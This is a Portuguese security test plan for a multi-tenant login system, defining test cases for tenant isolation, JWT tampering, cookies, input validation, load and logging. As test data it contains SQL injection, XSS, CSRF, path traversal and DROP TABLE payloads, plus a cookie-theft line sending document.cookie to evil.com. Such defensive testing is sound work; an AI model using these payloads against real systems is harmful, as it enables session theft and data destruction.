# Testes de Segurança e Integração - Autenticação de Tenants

**Data:** 28/10/2025  
**Status:** Pronto para Execução

---

## Overview

Este documento contém testes de segurança e integração end-to-end para validar a robustez do sistema de autenticação multi-tenant.

---

## Pré-requisitos

1. Backend e Frontend rodando
2. Múltiplos tenants configurados
3. Usuários de teste em diferentes tenants
4. Ferramentas de teste de segurança (opcional)

---

## Teste 1: Isolamento de Tenants

### Caso 1.1: Dados Isolados por Tenant

**Objetivo:** Garantir que um tenant não acesse dados de outro

**Setup:**
```sql
-- Tenant 1: Escritório Silva
INSERT INTO processos (numero, tenant_id) VALUES ('001/2025', 1);
INSERT INTO clientes (nome, tenant_id) VALUES ('João Silva', 1);

-- Tenant 2: Escritório Santos
INSERT INTO processos (numero, tenant_id) VALUES ('002/2025', 2);
INSERT INTO clientes (nome, tenant_id) VALUES ('Maria Santos', 2);
```

**Teste:**
1. Fazer login como usuário do Tenant 1
2. Acessar dashboard e verificar estatísticas
3. Fazer login como usuário do Tenant 2
4. Acessar dashboard e verificar estatísticas

**Resultado Esperado:**
- Tenant 1 vê apenas: 1 processo, 1 cliente
- Tenant 2 vê apenas: 1 processo, 1 cliente
- Nenhum tenant vê dados do outro

**Status:** [ ] Passou

---

### Caso 1.2: Tentativa de Acesso Direto a Dados de Outro Tenant

**Teste:**
1. Fazer login no Tenant 1
2. Obter token JWT
3. Tentar acessar stats do Tenant 2:
```bash
curl -X GET http://localhost:3000/api/dashboard/stats/2 \
  -H "Authorization: Bearer $TOKEN_TENANT_1"
```

**Resultado Esperado:**
- Status: 403 Forbidden
- Mensagem: "Acesso negado"

**Status:** [ ] Passou

---

### Caso 1.3: Manipulação de tenant-id no Token

**Teste:**
1. Obter token válido do Tenant 1
2. Decodificar token
3. Modificar claim `tenant-id` para 2
4. Re-assinar token (se possível)
5. Tentar usar token modificado

**Resultado Esperado:**
- Token modificado é rejeitado
- Assinatura inválida detectada
- Status: 401 Unauthorized

**Status:** [ ] Passou

---

## Teste 2: Autenticação e Autorização

### Caso 2.1: Força Bruta no Login

**Teste:**
1. Tentar fazer login 10 vezes com senha errada
2. Verificar se há rate limiting

**Resultado Esperado:**
- Após N tentativas, conta é bloqueada temporariamente
- Ou rate limiting impede múltiplas tentativas
- Mensagem apropriada é exibida

**Status:** [ ] Passou

---

### Caso 2.2: SQL Injection no Login

**Teste:**
1. Tentar login com payloads de SQL injection:
```
Email: admin@silva.com' OR '1'='1
Senha: ' OR '1'='1
```

**Resultado Esperado:**
- Login falha
- Nenhum erro de SQL é exposto
- Sistema permanece seguro

**Status:** [ ] Passou

---

### Caso 2.3: Token Replay Attack

**Teste:**
1. Fazer login e obter token
2. Fazer logout
3. Tentar reutilizar token antigo

**Resultado Esperado:**
- Token ainda é válido até expirar (comportamento esperado)
- Após expiração, token é rejeitado
- Implementar blacklist de tokens (opcional)

**Status:** [ ] Passou

---

### Caso 2.4: Token Expiration

**Teste:**
1. Fazer login
2. Aguardar 15 minutos (tempo de expiração)
3. Tentar acessar recurso protegido

**Resultado Esperado:**
- Token expirado é rejeitado
- Status: 401 Unauthorized
- Mensagem: "Token expirado"

**Status:** [ ] Passou

---

### Caso 2.5: Acesso sem Token

**Teste:**
1. Tentar acessar endpoint protegido sem token:
```bash
curl -X GET http://localhost:3000/api/dashboard/stats/1
```

**Resultado Esperado:**
- Status: 401 Unauthorized
- Mensagem: "Não autenticado"

**Status:** [ ] Passou

---

## Teste 3: Proteção contra Ataques Comuns

### Caso 3.1: XSS (Cross-Site Scripting)

**Teste:**
1. Tentar injetar script no campo de email:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

**Resultado Esperado:**
- Script não é executado
- Input é sanitizado
- Nenhum alert aparece

**Status:** [ ] Passou

---

### Caso 3.2: CSRF (Cross-Site Request Forgery)

**Teste:**
1. Criar página maliciosa que tenta fazer requisição:
```html
<form action="http://escritorio-silva.localhost:3001/api/tenant/login" method="POST">
  <input name="email" value="admin@silva.com">
  <input name="password" value="test123">
</form>
<script>document.forms[0].submit();</script>
```

**Resultado Esperado:**
- Requisição é bloqueada por CORS
- Ou token CSRF é requerido
- Ataque falha

**Status:** [ ] Passou

---

### Caso 3.3: Clickjacking

**Teste:**
1. Tentar incorporar página em iframe:
```html
<iframe src="http://escritorio-silva.localhost:3001/login"></iframe>
```

**Resultado Esperado:**
- Header `X-Frame-Options: DENY` impede iframe
- Ou `Content-Security-Policy: frame-ancestors 'none'`
- Página não carrega no iframe

**Status:** [ ] Passou

---

### Caso 3.4: Open Redirect

**Teste:**
1. Tentar redirecionar para site externo após login:
```
http://escritorio-silva.localhost:3001/login?redirect=https://evil.com
```

**Resultado Esperado:**
- Redirecionamento é validado
- Apenas URLs internas são permitidas
- Redirecionamento externo é bloqueado

**Status:** [ ] Passou

---

## Teste 4: Segurança de Cookies

### Caso 4.1: Cookie Flags

**Teste:**
1. Fazer login
2. Inspecionar cookie `access_token`

**Resultado Esperado:**
- `HttpOnly: true` (não acessível via JavaScript)
- `Secure: true` (apenas HTTPS em produção)
- `SameSite: Lax` (proteção CSRF)
- `Path: /` (escopo correto)

**Status:** [ ] Passou

---

### Caso 4.2: Cookie Scope

**Teste:**
1. Fazer login no Tenant 1
2. Verificar se cookie é enviado para Tenant 2

**Resultado Esperado:**
- Cookie é específico do subdomínio
- Tenant 2 não recebe cookie do Tenant 1

**Status:** [ ] Passou

---

### Caso 4.3: Cookie Theft via XSS

**Teste:**
1. Tentar roubar cookie via JavaScript:
```javascript
console.log(document.cookie);
fetch('https://evil.com?cookie=' + document.cookie);
```

**Resultado Esperado:**
- Cookie não aparece em `document.cookie`
- Flag HttpOnly impede acesso

**Status:** [ ] Passou

---

## Teste 5: Validação de Entrada

### Caso 5.1: Email Inválido

**Teste:**
1. Tentar login com emails inválidos:
```
- "não-é-email"
- "test@"
- "@example.com"
- "test..test@example.com"
```

**Resultado Esperado:**
- Validação client-side rejeita
- Validação server-side rejeita
- Mensagem de erro apropriada

**Status:** [ ] Passou

---

### Caso 5.2: Senha Vazia

**Teste:**
1. Tentar login com senha vazia

**Resultado Esperado:**
- Validação rejeita
- Mensagem: "Senha é obrigatória"

**Status:** [ ] Passou

---

### Caso 5.3: Subdomain Inválido

**Teste:**
1. Tentar login com subdomain malicioso:
```
- "../../../etc/passwd"
- "<script>alert('xss')</script>"
- "'; DROP TABLE tenants; --"
```

**Resultado Esperado:**
- Input é sanitizado
- Nenhum ataque é bem-sucedido

**Status:** [ ] Passou

---

## Teste 6: Fluxo Completo de Integração

### Caso 6.1: Fluxo Completo - Tenant 1

**Teste:**
1. Acessar `http://escritorio-silva.localhost:3001`
2. Verificar extração de subdomínio
3. Fazer login com `admin@silva.com`
4. Verificar token JWT
5. Acessar dashboard
6. Verificar estatísticas
7. Fazer logout
8. Verificar remoção de cookie

**Resultado Esperado:**
- Todos os passos funcionam sem erros
- Dados corretos em cada etapa
- Segurança mantida em todo fluxo

**Status:** [ ] Passou

---

### Caso 6.2: Fluxo com Tenant Inativo

**Teste:**
1. Acessar `http://escritorio-inativo.localhost:3001`
2. Tentar fazer login

**Resultado Esperado:**
- Middleware detecta tenant inativo
- Erro 403: "Escritório inativo"
- Login não é permitido

**Status:** [ ] Passou

---

### Caso 6.3: Fluxo com Usuário de Outro Tenant

**Teste:**
1. Acessar `http://escritorio-silva.localhost:3001`
2. Tentar login com usuário do Tenant 2

**Resultado Esperado:**
- Login falha
- Erro: "Usuário não pertence a este escritório"

**Status:** [ ] Passou

---

### Caso 6.4: Fluxo com Token Expirado

**Teste:**
1. Fazer login
2. Aguardar expiração do token (15 min)
3. Tentar acessar dashboard

**Resultado Esperado:**
- Middleware detecta token expirado
- Redireciona para login
- Mensagem: "Sessão expirada"

**Status:** [ ] Passou

---

### Caso 6.5: Fluxo com Múltiplos Tenants Simultâneos

**Teste:**
1. Abrir 2 navegadores/perfis
2. Fazer login no Tenant 1 no navegador 1
3. Fazer login no Tenant 2 no navegador 2
4. Verificar que cada sessão é independente

**Resultado Esperado:**
- Cada tenant tem sessão separada
- Não há interferência entre sessões
- Dados corretos para cada tenant

**Status:** [ ] Passou

---

## Teste 7: Testes de Carga e Performance

### Caso 7.1: Múltiplos Logins Simultâneos

**Teste:**
1. Simular 100 logins simultâneos
2. Medir tempo de resposta

**Resultado Esperado:**
- Sistema permanece responsivo
- Tempo de resposta < 2s para 95% das requisições
- Nenhum erro de timeout

**Status:** [ ] Passou

---

### Caso 7.2: Múltiplas Requisições ao Dashboard

**Teste:**
1. Fazer login
2. Fazer 50 requisições simultâneas ao dashboard

**Resultado Esperado:**
- Todas as requisições são atendidas
- Dados corretos em todas as respostas
- Sem erros de concorrência

**Status:** [ ] Passou

---

## Teste 8: Testes de Recuperação

### Caso 8.1: Backend Indisponível

**Teste:**
1. Parar o backend
2. Tentar fazer login no frontend

**Resultado Esperado:**
- Erro apropriado é exibido
- Mensagem: "Servidor indisponível"
- Frontend não quebra

**Status:** [ ] Passou

---

### Caso 8.2: Banco de Dados Indisponível

**Teste:**
1. Parar o banco de dados
2. Tentar fazer login

**Resultado Esperado:**
- Erro apropriado é exibido
- Mensagem genérica (não expõe detalhes)
- Sistema não quebra

**Status:** [ ] Passou

---

### Caso 8.3: Timeout de Requisição

**Teste:**
1. Simular timeout no backend (delay de 30s)
2. Tentar fazer login

**Resultado Esperado:**
- Frontend mostra timeout após ~10s
- Mensagem: "Tempo de resposta excedido"
- Usuário pode tentar novamente

**Status:** [ ] Passou

---

## Teste 9: Auditoria e Logs

### Caso 9.1: Logs de Login

**Teste:**
1. Fazer login bem-sucedido
2. Verificar logs do backend

**Resultado Esperado:**
- Log registra: timestamp, email, tenant-id, sucesso
- Senha NÃO é registrada
- IP do cliente é registrado (opcional)

**Status:** [ ] Passou

---

### Caso 9.2: Logs de Falha de Login

**Teste:**
1. Tentar login com senha errada
2. Verificar logs

**Resultado Esperado:**
- Log registra tentativa falhada
- Motivo da falha é registrado
- Senha NÃO é registrada

**Status:** [ ] Passou

---

### Caso 9.3: Logs de Acesso Negado

**Teste:**
1. Tentar acessar dados de outro tenant
2. Verificar logs

**Resultado Esperado:**
- Log registra tentativa de acesso negado
- Tenant-id solicitado e tenant-id do token são registrados

**Status:** [ ] Passou

---

## Teste 10: Conformidade e Boas Práticas

### Caso 10.1: OWASP Top 10

**Verificar proteção contra:**
- [ ] A01: Broken Access Control
- [ ] A02: Cryptographic Failures
- [ ] A03: Injection
- [ ] A04: Insecure Design
- [ ] A05: Security Misconfiguration
- [ ] A06: Vulnerable Components
- [ ] A07: Authentication Failures
- [ ] A08: Software and Data Integrity Failures
- [ ] A09: Security Logging Failures
- [ ] A10: Server-Side Request Forgery

**Status:** [ ] Passou

---

### Caso 10.2: Headers de Segurança

**Verificar presença de:**
- [ ] `X-Content-Type-Options: nosniff`
- [ ] `X-Frame-Options: DENY`
- [ ] `X-XSS-Protection: 1; mode=block`
- [ ] `Strict-Transport-Security` (HTTPS)
- [ ] `Content-Security-Policy`

**Status:** [ ] Passou

---

### Caso 10.3: HTTPS em Produção

**Verificar:**
- [ ] Certificado SSL válido
- [ ] Redirecionamento HTTP → HTTPS
- [ ] HSTS habilitado
- [ ] TLS 1.2+ apenas

**Status:** [ ] Passou

---

## Checklist de Segurança

### Autenticação
- [ ] Senhas são hasheadas (bcrypt)
- [ ] Tokens JWT são assinados
- [ ] Tokens têm expiração
- [ ] Logout invalida sessão

### Autorização
- [ ] Isolamento de tenants funciona
- [ ] Usuário não acessa dados de outro tenant
- [ ] Roles são validadas (admin vs operador)

### Proteção de Dados
- [ ] Cookies são HttpOnly
- [ ] Cookies são Secure (produção)
- [ ] Senhas nunca são retornadas
- [ ] Tokens não são expostos no client

### Validação
- [ ] Inputs são validados (client e server)
- [ ] SQL injection é prevenido
- [ ] XSS é prevenido
- [ ] CSRF é prevenido

### Logs e Auditoria
- [ ] Logins são registrados
- [ ] Falhas são registradas
- [ ] Acessos negados são registrados
- [ ] Senhas NÃO são registradas

### Infraestrutura
- [ ] HTTPS em produção
- [ ] Headers de segurança configurados
- [ ] Rate limiting implementado
- [ ] Backups configurados

---

## Resultados dos Testes

### Resumo
- Total de casos de teste: 40
- Casos passados: [ ]
- Casos falhados: [ ]
- Taxa de sucesso: [ ]%

### Vulnerabilidades Encontradas
1. [ ] Nenhuma vulnerabilidade encontrada
2. [ ] Listar vulnerabilidades aqui...

### Recomendações
1. [ ] Implementar rate limiting no login
2. [ ] Adicionar blacklist de tokens
3. [ ] Implementar 2FA (futuro)
4. [ ] Adicionar logs de auditoria mais detalhados

---

## Ferramentas Recomendadas

### Testes de Segurança
- OWASP ZAP - Scanner de vulnerabilidades
- Burp Suite - Proxy de interceptação
- SQLMap - Teste de SQL injection
- XSStrike - Teste de XSS

### Testes de Carga
- Apache JMeter
- k6
- Artillery

### Análise de Código
- SonarQube
- Snyk
- npm audit

---

## Notas

- Executar testes em ambiente de staging primeiro
- Documentar todas as vulnerabilidades encontradas
- Priorizar correções por severidade
- Re-testar após correções
- Manter este documento atualizado

---

**Documento criado em:** 28/10/2025  
**Última atualização:** 28/10/2025  
**Status:** Pronto para Execução
